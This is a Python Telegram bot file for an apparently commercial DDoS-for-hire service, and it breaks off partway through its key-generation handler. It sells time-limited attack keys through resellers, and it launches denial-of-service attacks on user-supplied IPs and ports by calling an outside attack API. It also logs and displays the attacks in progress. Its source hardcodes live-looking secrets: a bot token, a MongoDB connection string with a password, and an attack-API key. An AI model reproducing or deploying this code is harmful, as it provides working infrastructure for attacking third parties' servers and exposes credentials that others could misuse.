import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
import sys
from pymongo import MongoClient
from datetime import datetime, timedelta
import time
import requests
import psutil
from collections import defaultdict

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

BOT_START_TIME = datetime.now()

BOT_TOKEN = os.getenv("BOT_TOKEN", "8768507411:AAE6vOWmLz9av-Q4UGSFrgHNjf683nymcYY")
MONGO_URL = os.getenv("MONGO_URL", "mongodb+srv://gb824083_db_user:mYvnmJSLaZU0Wonw@gauravxddos.ajue9og.mongodb.net/?appName=GAURAVXDDOS")
BOT_OWNER = int(os.getenv("BOT_OWNER", "6539807903"))

print("Connecting to MongoDB...", flush=True)
try:
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client['telegram_bot']
    keys_collection = db['keys']
    users_collection = db['users']
    resellers_collection = db['resellers']
    attack_logs_collection = db['attack_logs']
    bot_users_collection = db['bot_users']
    bot_settings_collection = db['bot_settings']
    groups_collection = db['groups']
    cmd_media_collection = db['cmd_media']
    try:
        keys_collection.create_index('key', unique=True)
    except Exception as e:
        print(f"Key index warning: {e}", flush=True)
    users_collection.create_index('user_id', unique=True)
    resellers_collection.create_index('user_id', unique=True)
    bot_users_collection.create_index('user_id', unique=True)
    cmd_media_collection.create_index('command', unique=True)
    print("MongoDB connected successfully!", flush=True)
except Exception as e:
    print(f"MongoDB connection error: {e}", flush=True)
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

API_KEY = os.getenv("API_KEY", "mahakalda_d283ba18dc69dff43b189db84f1c19b19e32849e")
API_BASE = os.getenv("API_BASE", "http://mahakaldak.duckdns.org/api/v1/attack/start")
API_LIST = [
    f"{API_BASE}?key={API_KEY}&ip={{ip}}&port={{port}}&time={{duration}}",
    f"{API_BASE}?key={API_KEY}&ip={{ip}}&port={{port}}&time={{duration}}",
]
KEY_PREFIX = "@GAURAV_BHAI1-"
REQUIRED_CHANNELS = ["https://t.me/DESTROYDDOSLODER"]

def extract_channel_username(url):
    if url.startswith("https://t.me/"):
        return url.replace("https://t.me/", "").strip()
    elif url.startswith("t.me/"):
        return url.replace("t.me/", "").strip()
    return url.strip()

REQUIRED_CHANNEL_USERNAMES = [extract_channel_username(ch) for ch in REQUIRED_CHANNELS]

RESELLER_PRICING = {
    '12h': {'price': 25, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 50, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 130, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 250, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 750, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 1250, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}

DEFAULT_PRIVATE_MAX_ATTACK_TIME = 300
DEFAULT_GROUP_MAX_ATTACK_TIME = 60
DEFAULT_PRIVATE_COOLDOWN = 30
DEFAULT_GROUP_COOLDOWN = 120
DEFAULT_CONCURRENT_LIMIT = 2

def get_setting(key, default):
    try:
        setting = bot_settings_collection.find_one({'key': key})
        if setting:
            return setting['value']
        return default
    except:
        return default

def set_setting(key, value):
    bot_settings_collection.update_one({'key': key}, {'$set': {'key': key, 'value': value}}, upsert=True)

def update_reseller_pricing():
    for dur in RESELLER_PRICING:
        saved_price = get_setting(f'price_{dur}', None)
        if saved_price is not None:
            RESELLER_PRICING[dur]['price'] = saved_price

update_reseller_pricing()

def get_private_max_attack_time():
    try:
        return int(get_setting('private_max_attack_time', DEFAULT_PRIVATE_MAX_ATTACK_TIME))
    except:
        return DEFAULT_PRIVATE_MAX_ATTACK_TIME

def get_group_max_attack_time():
    try:
        return int(get_setting('group_max_attack_time', DEFAULT_GROUP_MAX_ATTACK_TIME))
    except:
        return DEFAULT_GROUP_MAX_ATTACK_TIME

def get_private_cooldown():
    try:
        return int(get_setting('private_cooldown', DEFAULT_PRIVATE_COOLDOWN))
    except:
        return DEFAULT_PRIVATE_COOLDOWN

def get_group_cooldown():
    try:
        return int(get_setting('group_cooldown', DEFAULT_GROUP_COOLDOWN))
    except:
        return DEFAULT_GROUP_COOLDOWN

def get_concurrent_limit():
    try:
        return int(get_setting('_cx_th', DEFAULT_CONCURRENT_LIMIT))
    except:
        return DEFAULT_CONCURRENT_LIMIT

def is_maintenance():
    return get_setting('maintenance_mode', False)

def get_maintenance_msg():
    return get_setting('maintenance_msg', 'Bot maintenance mein hai. Baad mein try karo.')

def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)

def get_blocked_ips():
    return get_setting('blocked_ips', [])

def add_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix not in blocked:
        blocked.append(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def remove_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix in blocked:
        blocked.remove(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def is_ip_blocked(ip):
    blocked = get_blocked_ips()
    for prefix in blocked:
        if ip.startswith(prefix):
            return True
    return False

def get_port_protection():
    settings = bot_settings_collection.find_one({})
    if settings:
        return settings.get('port_protection', True)
    return True

def get_channel_required():
    return get_setting('channel_required', True)

def set_channel_required(enabled):
    set_setting('channel_required', enabled)

def get_ddos_protection():
    return get_setting('ddos_protection', True)

def set_ddos_protection(enabled):
    set_setting('ddos_protection', enabled)

def get_approved_groups():
    return get_setting('approved_groups', [])

def add_approved_group(group_id):
    approved = get_approved_groups()
    if group_id not in approved:
        approved.append(group_id)
        set_setting('approved_groups', approved)
        return True
    return False

def remove_approved_group(group_id):
    approved = get_approved_groups()
    if group_id in approved:
        approved.remove(group_id)
        set_setting('approved_groups', approved)
        return True
    return False

def is_group_approved(group_id):
    approved = get_approved_groups()
    return group_id in approved

def get_feedback_enabled():
    return get_setting('feedback_enabled', True)

def set_feedback_enabled(enabled):
    set_setting('feedback_enabled', enabled)

def get_reel_enabled():
    return get_setting('reel_enabled', True)

def set_reel_enabled(enabled):
    set_setting('reel_enabled', enabled)

def get_reel_list():
    reels = get_setting('reel_list', [])
    return reels if isinstance(reels, list) else []

def add_reel(file_id):
    reels = get_reel_list()
    if file_id not in reels:
        reels.append(file_id)
        set_setting('reel_list', reels)
        return True
    return False

def remove_reel(index):
    reels = get_reel_list()
    if 0 <= index < len(reels):
        removed = reels.pop(index)
        set_setting('reel_list', reels)
        return removed
    return None

def get_random_reel():
    reels = get_reel_list()
    if reels:
        return random.choice(reels)
    return None

class DDOSProtection:
    def __init__(self):
        self.user_requests = defaultdict(list)
        self.chat_requests = defaultdict(list)
        self.blocked_users = set()
        self.global_counter = 0
        self.global_reset = time.time()
        self.attack_history = defaultdict(list)
        self.enabled = True

    def is_ddos_attack(self, user_id, chat_id):
        if not self.enabled:
            return False
        now = time.time()
        if user_id in self.blocked_users:
            return True
        if now - self.global_reset > 1:
            self.global_counter = 0
            self.global_reset = now
        self.global_counter += 1
        if self.global_counter > 30:
            print(f"Global rate limit exceeded: {self.global_counter} RPS")
            time.sleep(0.1)
            return True
        self.user_requests[user_id] = [t for t in self.user_requests[user_id] if now - t < 5]
        if len(self.user_requests[user_id]) >= 5:
            self.blocked_users.add(user_id)
            print(f"Blocked spammer user: {user_id}")
            return True
        self.chat_requests[chat_id] = [t for t in self.chat_requests[chat_id] if now - t < 5]
        if len(self.chat_requests[chat_id]) >= 20:
            print(f"Chat rate limit: {len(self.chat_requests[chat_id])} req/5s")
            time.sleep(0.05)
            return True
        self.user_requests[user_id].append(now)
        self.chat_requests[chat_id].append(now)
        return False

protection = DDOSProtection()

def check_maintenance(message):
    if is_maintenance() and message.from_user.id != BOT_OWNER:
        bot.reply_to(message, get_maintenance_msg())
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return False
    user = users_collection.find_one({'user_id': user_id})
    if user and user.get('banned'):
        if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
            if datetime.now() > user['ban_expiry']:
                users_collection.update_one({'user_id': user_id}, {'$set': {'banned': False}, '$unset': {'ban_expiry': "", 'ban_type': ""}})
                return False
            expiry_str = user['ban_expiry'].strftime('%d-%m-%Y %H:%M:%S')
            bot.reply_to(message, f"TUM TEMPORARY BAN HO!\n\nExpiry: {expiry_str}\nTum abhi kuch nahi kar sakte.\n\nContact Your Seller")
            return True
        bot.reply_to(message, f"TUM PERMANENT BAN HO!\n\nTum kuch nahi kar sakte.\n\nContact Your Seller")
        return True
    return False

def check_channel_join(message):
    if not get_channel_required():
        return True
    user_id = message.from_user.id
    if user_id == BOT_OWNER or is_reseller(user_id):
        return True
    not_joined = []
    for channel_username in REQUIRED_CHANNEL_USERNAMES:
        try:
            chat_member = bot.get_chat_member(f"@{channel_username}", user_id)
            if chat_member.status not in ['member', 'administrator', 'creator']:
                not_joined.append(f"@{channel_username}")
        except Exception as e:
            print(f"Channel check error for {channel_username}: {e}")
            not_joined.append(f"@{channel_username}")
    if not_joined:
        channels_text = "\n".join([f"- {ch}" for ch in not_joined])
        bot.reply_to(message, f"PLEASE JOIN REQUIRED CHANNEL!\n\nAttack karne se pehle ye channel join karo:\n\n{channels_text}\n\nJoin karne ke baad /verify use karke confirm karo.\nPhir /attack command use karo.\n\nChannel: {', '.join(REQUIRED_CHANNEL_USERNAMES)}")
        return False
    return True

def check_group_approval(message):
    chat_id = message.chat.id
    if message.chat.type in ['private', 'personal']:
        return True
    if message.from_user.id == BOT_OWNER:
        return True
    if is_group_approved(chat_id):
        return True
    bot.reply_to(message, f"GROUP NOT APPROVED!\n\nThis group is not approved for attacks.\n\nGroup ID: <code>{chat_id}</code>\n\nContact owner to approve this group.\nOwner can use: /addgrp {chat_id}", parse_mode="HTML")
    return False

import threading as _threading
import time as _time
_attack_lock = _threading.Lock()

def maintenance_auto_extender():
    while True:
        try:
            if is_maintenance():
                now = datetime.now()
                active_users = users_collection.find({'key_expiry': {'$gt': now}})
                for user in active_users:
                    new_expiry = user['key_expiry'] + timedelta(minutes=1)
                    users_collection.update_one({'_id': user['_id']}, {'$set': {'key_expiry': new_expiry}})
            _time.sleep(60)
        except Exception as e:
            print(f"Maintenance extender error: {e}")
            _time.sleep(10)

extender_thread = _threading.Thread(target=maintenance_auto_extender, daemon=True)
extender_thread.start()

active_attacks = {}
user_cooldowns = {}
api_in_use = {}
user_attack_history = {}
bot_start_time = datetime.now()
pending_feedback = {}

def set_pending_feedback(user_id, target, port, duration):
    pending_feedback[user_id] = {"target": target, "port": port, "duration": duration, "timestamp": datetime.now()}

def get_pending_feedback(user_id):
    return pending_feedback.get(user_id)

def clear_pending_feedback(user_id):
    if user_id in pending_feedback:
        del pending_feedback[user_id]

def log_attack(user_id, username, target, port, duration):
    attack_logs_collection.insert_one({'user_id': user_id, 'username': username, 'target': target, 'port': port, 'duration': duration, 'timestamp': datetime.now()})

def generate_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    return None, None

def is_owner(user_id):
    return user_id == BOT_OWNER

def is_reseller(user_id):
    reseller = resellers_collection.find_one({'user_id': user_id, 'blocked': {'$ne': True}})
    return reseller is not None

def get_reseller(user_id):
    return resellers_collection.find_one({'user_id': user_id})

def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    user = users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if user:
        return user['user_id'], user.get('username')
    reseller = resellers_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if reseller:
        return reseller['user_id'], reseller.get('username')
    bot_user = bot_users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if bot_user:
        return bot_user['user_id'], bot_user.get('username')
    return None, None

def has_valid_key(user_id):
    user = users_collection.find_one({'user_id': user_id, 'key': {'$ne': None}})
    if not user or not user.get('key_expiry'):
        return False
    if datetime.now() > user['key_expiry']:
        users_collection.update_one({'user_id': user_id}, {'$set': {'key': None, 'key_expiry': None}})
        return False
    return True

def get_time_remaining(user_id):
    user = users_collection.find_one({'user_id': user_id})
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
    remaining = user['key_expiry'] - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def format_timedelta(td):
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def get_user_cooldown(user_id, is_group=False):
    with _attack_lock:
        if user_id not in user_cooldowns:
            return 0
        cooldown_end = user_cooldowns[user_id]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining <= 0:
            del user_cooldowns[user_id]
            return 0
        return int(remaining)

def set_user_cooldown(user_id, is_group=False):
    with _attack_lock:
        cooldown_time = get_group_cooldown() if is_group else get_private_cooldown()
        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time)

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        return len(active_attacks)

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def get_max_concurrent():
    return len(API_LIST)

def get_free_api_index():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        busy_indices = set(api_in_use.values())
        for i in range(len(API_LIST)):
            if i not in busy_indices:
                return i
        return None

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def send_long_message(message, text, parse_mode=None):
    max_length = 4000
    if len(text) <= max_length:
        if parse_mode:
            bot.reply_to(message, text, parse_mode=parse_mode)
        else:
            bot.reply_to(message, text)
    else:
        parts = []
        current_part = ""
        lines = text.split('\n')
        for line in lines:
            if len(current_part) + len(line) + 1 > max_length:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        if current_part:
            parts.append(current_part)
        for i, part in enumerate(parts):
            try:
                if i == 0:
                    if parse_mode:
                        bot.reply_to(message, part, parse_mode=parse_mode)
                    else:
                        bot.reply_to(message, part)
                else:
                    if parse_mode:
                        bot.send_message(message.chat.id, part, parse_mode=parse_mode)
                    else:
                        bot.send_message(message.chat.id, part)
                time.sleep(0.3)
            except:
                pass

def track_bot_user(user_id, username=None):
    try:
        bot_users_collection.update_one({'user_id': user_id}, {'$set': {'user_id': user_id, 'username': username, 'last_seen': datetime.now()}}, upsert=True)
    except:
        pass

def _call_single_api(slot_index, url, target, port, duration):
    try:
        response = requests.get(url, timeout=10)
        print(f"[API Slot {slot_index+1}] Target: {target}:{port} | Status: {response.status_code} | Response: {response.text}", flush=True)
    except Exception as e:
        print(f"[API Slot {slot_index+1}] Target: {target}:{port} | Error: {e}", flush=True)

def generate_attack_start_ui(target, port, duration, user_name):
    return f'''🚀 <b>Attack Started!</b>

📍 <code>{target} {port}</code>
⏱ <b>Duration:</b> {duration}s
👤 <b>Name :</b> {user_name}
📊 <b>Monitor:</b> Type /status to see live progress'''

def generate_attack_complete_ui(target, port, duration):
    return f'''✅ <b>Attack Finished!</b>

📍 <code>{target} {port}</code>
⏱ <b>Duration:</b> {duration}s
⚡ <b>Status:</b> Completed

📝 Please submit feedback'''

def generate_global_status_ui():
    get_active_attack_count()
    attacks = list(active_attacks.items())
    if not attacks:
        return "No active attacks right now."
    header = "<b>ACTIVE ATTACKS STATUS</b>\n----------------------"
    body = ""
    for idx, (attack_id, info) in enumerate(attacks[:10], 1):
        remaining = (info['end_time'] - datetime.now()).total_seconds()
        if remaining < 0:
            continue
        total_dur = info['duration']
        elapsed = total_dur - remaining
        percent = int((elapsed / total_dur) * 100) if total_dur > 0 else 0
        filled = int(percent / 5)
        empty = 20 - filled
        bar = "#" * filled + "-" * empty
        user_id = info.get('user_id', 'Unknown')
        user_type = "Private" if not info.get('is_group', False) else "Group"
        body += f"\n<b>Target:</b> <code>{info['target']} {info['port']}</code>\n<b>Remaining:</b> {int(remaining)}s | <b>By:</b> {user_id} ({user_type})\n<b>Progress:</b> {bar} {percent}%\n"
    footer = "----------------------"
    return header + body + footer

def start_attack(target, port, duration, message, attack_id, api_index, is_group=False):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        display_name = message.from_user.first_name or (message.from_user.username or str(user_id))
        log_attack(user_id, username, target, port, duration)
        if not is_owner(user_id) and get_feedback_enabled():
            set_pending_feedback(user_id, target, port, duration)
        attack_start_msg = generate_attack_start_ui(target, port, duration, display_name)
        try:
            if get_reel_enabled():
                reel_id = get_random_reel()
                if reel_id:
                    bot.send_video(message.chat.id, reel_id, caption=attack_start_msg, supports_streaming=True, parse_mode="HTML")
                else:
                    bot.reply_to(message, attack_start_msg, parse_mode="HTML")
            else:
                bot.reply_to(message, attack_start_msg, parse_mode="HTML")
        except Exception as e:
            print(f"Reel send error: {e}")
            bot.reply_to(message, attack_start_msg, parse_mode="HTML")
        api_url = API_LIST[api_index].format(ip=target, port=port, duration=duration)
        try:
            t = threading.Thread(target=_call_single_api, args=(api_index, api_url, target, port, duration))
            t.daemon = True
            t.start()
        except Exception as e:
            print(f"[API Slot {api_index+1}] Launch Error: {e}", flush=True)
        time.sleep(duration)
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        complete_msg = generate_attack_complete_ui(target, port, duration)
        bot.reply_to(message, complete_msg, parse_mode="HTML")
    except Exception as e:
        print(f"start_attack error: {e}")
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]

def _send_cmd_media(chat_id, file_id, file_type, caption=None, reply_to=None):
    try:
        kw = {}
        if caption:
            kw['caption'] = caption
        if reply_to:
            kw['reply_to_message_id'] = reply_to
        if file_type == 'video':
            bot.send_video(chat_id, file_id, supports_streaming=True, **kw)
        elif file_type == 'document':
            bot.send_document(chat_id, file_id, **kw)
        elif file_type == 'animation':
            bot.send_animation(chat_id, file_id, **kw)
        elif file_type == 'audio':
            bot.send_audio(chat_id, file_id, **kw)
        elif file_type == 'voice':
            bot.send_voice(chat_id, file_id, **kw)
        elif file_type == 'photo':
            bot.send_photo(chat_id, file_id, **kw)
        elif file_type == 'text':
            bot.send_message(chat_id, file_id, reply_to_message_id=reply_to)
        return True
    except Exception as e:
        print(f"send_cmd_media error: {e}")
        return False

def _extract_media_from_reply(reply):
    if not reply:
        return None, None, None
    if reply.video:
        return reply.video.file_id, 'video', reply.caption or ""
    if reply.document:
        return reply.document.file_id, 'document', reply.caption or ""
    if reply.animation:
        return reply.animation.file_id, 'animation', reply.caption or ""
    if reply.audio:
        return reply.audio.file_id, 'audio', reply.caption or ""
    if reply.voice:
        return reply.voice.file_id, 'voice', ""
    if reply.photo:
        return reply.photo[-1].file_id, 'photo', reply.caption or ""
    if reply.text:
        return reply.text, 'text', ""
    return None, None, None

def _set_cmd_media(cmd, message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    reply = message.reply_to_message
    file_id, file_type, caption = None, None, ""
    if reply:
        file_id, file_type, caption = _extract_media_from_reply(reply)
        if not file_id:
            bot.reply_to(message, "Ye media type supported nahi hai.")
            return
    else:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, f"Usage:\n\nKisi video/file ko reply karke: /set{cmd}\nYa text ke liye: /set{cmd} Your text here")
            return
        file_id, file_type = parts[1].strip(), 'text'
    cmd_media_collection.update_one({'command': cmd}, {'$set': {'command': cmd, 'file_id': file_id, 'file_type': file_type, 'caption': caption, 'set_by': message.from_user.id, 'set_at': datetime.now()}}, upsert=True)
    bot.reply_to(message, f"{cmd.upper()} set ho gaya!\n\nType: {file_type}\nCaption: {caption[:80] if caption else 'None'}")

@bot.message_handler(commands=['setcanary'])
def set_canary_command(message):
    _set_cmd_media('canary', message)

@bot.message_handler(commands=['setios'])
def set_ios_command(message):
    _set_cmd_media('ios', message)

@bot.message_handler(commands=['setandroid'])
def set_android_command(message):
    _set_cmd_media('android', message)

def _send_setup(cmd, message):
    if check_maintenance(message): return
    if check_banned(message): return
    if not check_channel_join(message): return
    entry = cmd_media_collection.find_one({'command': cmd})
    if not entry:
        bot.reply_to(message, f"{cmd.upper()} file abhi upload nahi hui. Please wait...")
        return
    ok = _send_cmd_media(message.chat.id, entry['file_id'], entry['file_type'], caption=entry.get('caption') or None, reply_to=message.message_id)
    if not ok:
        bot.reply_to(message, "File bhejne mein dikkat aayi.")

@bot.message_handler(commands=['canary'])
def canary_command(message):
    _send_setup('canary', message)

@bot.message_handler(commands=['ios'])
def ios_command(message):
    _send_setup('ios', message)

@bot.message_handler(commands=['android'])
def android_command(message):
    _send_setup('android', message)

@bot.message_handler(commands=['setupstatus'])
def setup_status_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Sirf owner use kar sakta hai!")
        return
    lines = "SETUP STATUS\n============\n\n"
    for cmd in ['canary', 'ios', 'android']:
        entry = cmd_media_collection.find_one({'command': cmd})
        if entry:
            when = entry.get('set_at')
            when_str = when.strftime('%d-%m-%Y %H:%M') if when else 'N/A'
            lines += f"OK /{cmd}\n   Type: {entry['file_type']}\n   Set: {when_str}\n\n"
        else:
            lines += f"NOT SET /{cmd}\n\n"
    lines += "============\nSet: /setcanary /setios /setandroid"
    bot.reply_to(message, lines)

@bot.message_handler(commands=['delsetup'])
def del_setup_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Sirf owner use kar sakta hai!")
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /delsetup <canary|ios|android>")
        return
    cmd = parts[1].strip().lower().lstrip('/')
    if cmd not in ['canary', 'ios', 'android']:
        bot.reply_to(message, "Sirf canary / ios / android allowed hai.")
        return
    r = cmd_media_collection.delete_one({'command': cmd})
    if r.deleted_count:
        bot.reply_to(message, f"/{cmd} setup delete ho gaya!")
    else:
        bot.reply_to(message, f"/{cmd} pe kuch set nahi tha.")

@bot.message_handler(commands=['reel_on'])
def reel_on_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    set_reel_enabled(True)
    bot.reply_to(message, "Reel feature ENABLED!")

@bot.message_handler(commands=['reel_off'])
def reel_off_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    set_reel_enabled(False)
    bot.reply_to(message, "Reel feature DISABLED!")

@bot.message_handler(commands=['addreel'])
def add_reel_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    if not message.reply_to_message:
        bot.reply_to(message, "Kisi video message ko reply karke /addreel likho.")
        return
    if message.reply_to_message.video:
        file_id = message.reply_to_message.video.file_id
    elif message.reply_to_message.animation:
        file_id = message.reply_to_message.animation.file_id
    else:
        bot.reply_to(message, "Sirf video ya GIF add kar sakte ho.")
        return
    if add_reel(file_id):
        count = len(get_reel_list())
        bot.reply_to(message, f"Reel added! Total reels: {count}")
    else:
        bot.reply_to(message, "Ye reel pehle se add hai.")

@bot.message_handler(commands=['removereel'])
def remove_reel_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /removereel <index>\nUse /listreels to see indexes.")
        return
    try:
        index = int(parts[1]) - 1
    except:
        bot.reply_to(message, "Invalid index! Number daalo.")
        return
    removed = remove_reel(index)
    if removed:
        bot.reply_to(message, f"Reel #{index+1} remove kar di gayi.")
    else:
        bot.reply_to(message, "Invalid index! Use /listreels to see correct index.")

@bot.message_handler(commands=['listreels'])
def list_reels_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    reels = get_reel_list()
    if not reels:
        bot.reply_to(message, "Koi reel nahi hai. /addreel se add karo.")
        return
    response = "REEL LIST\n\n"
    for i, fid in enumerate(reels, 1):
        response += f"{i}. {fid[:10]}...\n"
    response += f"\nTotal: {len(reels)} reels"
    bot.reply_to(message, response)

@bot.message_handler(commands=["verify"])
def verify_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    if not get_channel_required():
        bot.reply_to(message, "Channel join required nahi hai.")
        return
    if user_id == BOT_OWNER or is_reseller(user_id):
        bot.reply_to(message, "Owner/Reseller bypass.")
        return
    not_joined = []
    for channel_username in REQUIRED_CHANNEL_USERNAMES:
        try:
            chat_member = bot.get_chat_member(f"@{channel_username}", user_id)
            if chat_member.status not in ['member', 'administrator', 'creator']:
                not_joined.append(f"@{channel_username}")
        except Exception as e:
            print(f"Verify error for {channel_username}: {e}")
            not_joined.append(f"@{channel_username}")
    if not_joined:
        channels_text = "\n".join([f"- {ch}" for ch in not_joined])
        bot.reply_to(message, f"Not joined:\n{channels_text}\n\nJoin then /verify again.")
    else:
        bot.reply_to(message, f"Verified!\nChannel: {', '.join(REQUIRED_CHANNEL_USERNAMES)}")

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    bot.reply_to(message, f"<code>{message.from_user.id}</code>", parse_mode="HTML")

@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()
    total_users = users_collection.count_documents({})
    maintenance_status = "Disabled" if not is_maintenance() else "Enabled"
    uptime_seconds = (datetime.now() - bot_start_time).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    channel_status = "Required" if get_channel_required() else "Not Required"
    ddos_status = "ON" if get_ddos_protection() else "OFF"
    approved_count = len(get_approved_groups())
    reel_count = len(get_reel_list())
    reel_status = "ON" if get_reel_enabled() else "OFF"
    feedback_status = "ON" if get_feedback_enabled() else "OFF"
    response = f"Pong!\n\nResponse: {response_time}ms\nStatus: Online\nUsers: {total_users}\nMaintenance: {maintenance_status}\nChannel: {channel_status}\nDDoS: {ddos_status}\nGroups: {approved_count}\nUptime: {uptime_str}\nReels: {reel_count} ({reel_status})\nFeedback: {feedback_status}\nMax Slots: {len(API_LIST)}\n\nPrivate: Max {get_private_max_attack_time()}s | Cooldown {get_private_cooldown()}s\nGroups: Max {get_group_max_attack_time()}s | Cooldown {get_group_cooldown()}s"
    bot.reply_to(message, response)

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    reseller = get_reseller(user_id)
    if is_owner(user_id):
        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "Usage: /gen <duration> <count>\n\nFormat: s/m/h/d\nExample: /gen 1d 1\nBulk: /gen 1d 5")
            return
        duration_str = command_parts[1].lower()
        duration, duration_label = parse_duration(duration_str)
        if not duration:
            bot.reply_to(message, "Invalid format! Use: s/m/h/d")
            return
        try:
            count = int(command_parts[2])
            if count < 1 or count > 50:
                bot.reply_to(message, "Count 1-50 ke beech hona chahiye!")
                return
        except:
            bot.reply_to(message, "Invalid count!")
            return
        generated_keys = []
        for _ in range(count):
            key = f"{KEY_PREFIX}{generate_key(12)}"
            key_doc = {'key': key, 'duration_seconds': int(duration.total_seconds()), 'duration_label': duration_label, 'created_at': datetime.now(), 'created_by': user_id, 'created_by_type': 'owner', 'used': False, 'used_by': None, 'used_at': None, 'max_users': 1}
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
        if count == 1:
            bot.reply_to(message, f"<b>Key Generated!</b>\n\n<code>/redeem {generated_keys[0]}</code>\n\n<b>Duration:</b> {duration_label}", parse_mode="HTML")
        else:
            keys_text = "\n".join([f"<code>/redeem {k}</code>" for k in generated_keys])
            bot.reply_to(message, f"<b>{count} Keys Generated!</b>\n\n{keys_text}\n\n<b>Duration:</b> {duration_label}", parse_mode="HTML")
    elif reseller:
        if reseller.get('blocked'):
            bot.reply_to(message, "Aapka panel blocked hai!")
            return
        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "Usage: /gen <duration> <count>\n\nDurations: 12h, 1d, 3d, 7d, 30d, 60d\n\nExample: /gen 1d 1\nBulk: /gen 1d 5")
            return
